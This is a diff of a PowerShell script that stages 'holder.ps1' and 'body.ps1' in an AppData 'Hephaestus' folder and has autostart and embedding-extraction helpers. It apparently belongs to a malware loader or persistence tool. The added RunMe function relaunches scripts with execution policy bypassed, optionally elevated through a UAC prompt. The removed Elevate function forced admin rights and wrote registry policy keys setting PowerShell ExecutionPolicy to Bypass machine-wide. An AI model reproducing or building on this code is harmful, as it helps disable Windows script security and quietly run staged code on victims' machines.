@@ -55,22 +55,22 @@ function Utf8NoBom {
 
 function Get-HephaestusFolder {
     $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
-    $HephaestusFolder = Join-Path $appDataPath 'Hephaestus'
-    return $HephaestusFolder
+    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
+    return $hephaestusFolder
 }
 
-function Get-HephaestusPath {
-    $HephaestusFolder = Get-HephaestusFolder
+function Get-HolderPath {
+    $hephaestusFolder = Get-HephaestusFolder
     $scriptName = 'holder' + '.' + 'ps1'
-    $HephaestusPath = Join-Path $HephaestusFolder $scriptName
-    return $HephaestusPath
+    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
+    return $holderPath
 }
 
 function Get-BodyPath {
-    $HephaestusFolder = Get-HephaestusFolder
+    $hephaestusFolder = Get-HephaestusFolder
     $scriptName = 'body' + '.' + 'ps1'
-    $HephaestusPath = Join-Path $HephaestusFolder $scriptName
-    return $HephaestusPath
+    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
+    return $bodyPath
 }
 
 
@@ -85,12 +85,9 @@ function ExtractEmbedding {
 }
 
 function Test-Arg{ param ([string]$arg)
-    $srcArgs = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) `"$($_.Value)`"" }
-    $srcArgs += $MyInvocation.UnboundArguments
-    $argString = $srcArgs -join ' '
-    if ($argString -like "*$arg*")
-    {
-        return $true;
+    $globalArgs = $global:args -join ' '
+    if ($globalArgs -like "*$arg*") {
+        return $true
     }
     return $false
 } 
@@ -99,78 +96,44 @@ function Test-Autostart
 {
     return Test-Arg -arg "autostart"
 }
-function Test-Gui
-{
-    return Test-Arg -arg "guimode"
-}
 
-function ReRun {
-    param ([string]$arg, [bool]$uac)
-    $localArguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) `"$($_.Value)`"" }
-    $localArguments += $MyInvocation.UnboundArguments
-    if (-not [string]::IsNullOrEmpty($string)) {
-        $localArguments += "-$arg"
-    }
-    $localArgumentList = @("-File", $MyInvocation.MyCommand.Path) + $localArguments
-    if ($uac -eq $true)
+
+function RunMe {
+    param (
+        [string]$script, 
+        [string]$arg,
+        [bool]$uac
+    )
+
+    try 
     {
-        Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs
+        $scriptPath = $script
+        
+        $localArguments = @("-ExecutionPolicy Bypass")
+        
+        $globalArgs = $global:args
+        foreach ($globalArg in $globalArgs) {
+            $localArguments += "-Argument `"$globalArg`""
+        }
+
+        if (-not [string]::IsNullOrEmpty($arg)) {
+            $localArguments += "-$arg"
+        }
+
+        $localArgumentList = @("-File", $scriptPath) + $localArguments
+        
+        if ($uac -eq $true) {
+            Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs
+        } else {
+            Start-Process powershell.exe -ArgumentList $localArgumentList
+        }
     }
-    else {
-        Start-Process powershell.exe -ArgumentList $localArgumentList
+    catch {
+          writedbg "RunMe: $_"
     }
-    exit
+
 }
 
-
-function Elevate()
-{ 
-  if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
-  {
-      ReRun -arg "" -uac $true
-      exit
-  }
-
-  try {
-    $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
-
-  if (-not (Test-Path $registryPath)) {
-      New-Item -Path $registryPath -Force
-  }
-  Set-ItemProperty -Path $registryPath -Name "EnableScripts" -Value 1 -Type DWord
-  Set-ItemProperty -Path $registryPath -Name "ExecutionPolicy" -Value "Bypass" -Type String
-  Write-Host "Registry values have been set successfully."
-  }
-  catch {
-
-  }
-
-  try {
-    $registryPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
-
-  if (-not (Test-Path $registryPath)) {
-      New-Item -Path $registryPath -Force
-  }
-  Set-ItemProperty -Path $registryPath -Name "EnableScripts" -Value 1 -Type DWord
-  Set-ItemProperty -Path $registryPath -Name "ExecutionPolicy" -Value "Bypass" -Type String
-  Write-Host "Registry values have been set successfully."
-  }
-  catch {
-
-  }
-
-  try {
-    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force;
-  }
-  catch { 
-  }
-
-  try {
-    Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass -Force;
-  }
-  catch {
-  }
-}
 
 function Get-EnvPaths {
     $a = Get-LocalAppDataPath
